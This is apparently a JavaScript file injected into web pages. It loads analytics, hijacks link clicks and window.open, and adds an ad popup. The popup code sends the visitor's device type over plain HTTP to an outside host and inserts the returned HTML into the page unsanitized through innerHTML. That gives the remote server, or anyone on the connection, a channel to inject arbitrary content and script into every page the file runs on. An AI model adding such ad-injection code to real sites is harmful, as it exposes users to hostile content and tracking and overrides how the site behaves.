window.addEventListener("DOMContentLoaded",()=>{const t=document.createElement("script");t.src="https://www.googletagmanager.com/gtag/js?id=G-W5GKHM0893",t.async=!0,document.head.appendChild(t);const n=document.createElement("script");n.textContent="window.dataLayer = window.dataLayer || [];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());gtag('config', 'G-W5GKHM0893');",document.body.appendChild(n)});// ========== 原有核心逻辑（保留不动） ==========
const hookClick = (e) => {
    const origin = e.target.closest('a')
    const isBaseTargetBlank = document.querySelector(
        'head base[target="_blank"]'
    )
    console.log('origin', origin, isBaseTargetBlank)
    if (
        (origin && origin.href && origin.target === '_blank') ||
        (origin && origin.href && isBaseTargetBlank)
    ) {
        e.preventDefault()
        console.log('handle origin', origin)
        location.href = origin.href
    } else {
        console.log('not handle origin', origin)
    }
}

window.open = function (url, target, features) {
    console.log('open', url, target, features)
    location.href = url
}

document.addEventListener('click', hookClick, { capture: true })

// ========== 新增广告弹窗逻辑 ==========
class AdPopup {
    constructor() {
        // 广告接口地址
        this.adApi = 'http://www.hyh.work.gd:8081/ad.php';
        // 缓存用户信息（设备类型/IP）
        this.userInfo = {
            deviceType: this.getDeviceType(),
            ip: ''
        };
        // 广告弹窗DOM
        this.adContainer = null;
    }

    // 1. 识别设备类型（PC/移动端/平板）
    getDeviceType() {
        const ua = navigator.userAgent.toLowerCase();
        if (/mobile|android|ios|iphone|ipad|ipod|webos|blackberry|iemobile|opera mini/i.test(ua)) {
            return /ipad/i.test(ua) ? 'tablet' : 'mobile';
        }
        return 'pc';
    }

    // 2. 请求广告接口，获取广告内容+用户IP（接口需返回JSON格式）
    async fetchAdData() {
        try {
            // 向接口传递设备类型参数，接口返回广告内容+用户IP
            const response = await fetch(`${this.adApi}?deviceType=${this.userInfo.deviceType}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json'
                }
            });
            
            if (!response.ok) throw new Error('接口请求失败');
            const data = await response.json();
            
            // 缓存接口返回的用户IP（推荐由后端解析IP，前端不可靠）
            if (data.ip) this.userInfo.ip = data.ip;
            return data.adContent || '<div>默认广告内容</div>';
        } catch (error) {
            console.error('广告接口请求失败：', error);
            // 接口失败时显示默认广告
            return `<div style="padding:20px;">
                广告加载失败<br>
                你的设备：${this.userInfo.deviceType}<br>
                IP：暂无法获取
            </div>`;
        }
    }

    // 3. 创建广告弹窗DOM
    createAdContainer() {
        // 避免重复创建弹窗
        if (this.adContainer) return this.adContainer;

        const container = document.createElement('div');
        container.id = 'custom-ad-popup';
        container.style.cssText = `
            position: fixed;
            bottom: 20px;
            right: 20px;
            width: 320px;
            background: #fff;
            border: 1px solid #eee;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            z-index: 9999;
            overflow: hidden;
        `;

        // 关闭按钮
        const closeBtn = document.createElement('button');
        closeBtn.innerText = '×';
        closeBtn.style.cssText = `
            position: absolute;
            top: 5px;
            right: 5px;
            background: transparent;
            border: none;
            font-size: 18px;
            cursor: pointer;
            color: #999;
        `;
        closeBtn.onclick = () => container.style.display = 'none';

        // 广告内容容器
        const adContent = document.createElement('div');
        adContent.id = 'ad-content';
        adContent.style.padding = '10px';

        container.appendChild(closeBtn);
        container.appendChild(adContent);
        document.body.appendChild(container);

        this.adContainer = container;
        return container;
    }

    // 4. 初始化广告弹窗
    async init() {
        // 创建弹窗DOM
        const container = this.createAdContainer();
        // 获取广告内容
        const adHtml = await this.fetchAdData();
        // 渲染广告内容
        document.getElementById('ad-content').innerHTML = adHtml;
        
        console.log('广告初始化完成', {
            userInfo: this.userInfo,
            adContent: adHtml
        });
    }
}

// 页面加载完成后初始化广告
window.addEventListener('DOMContentLoaded', async () => {
    const adPopup = new AdPopup();
    await adPopup.init();
});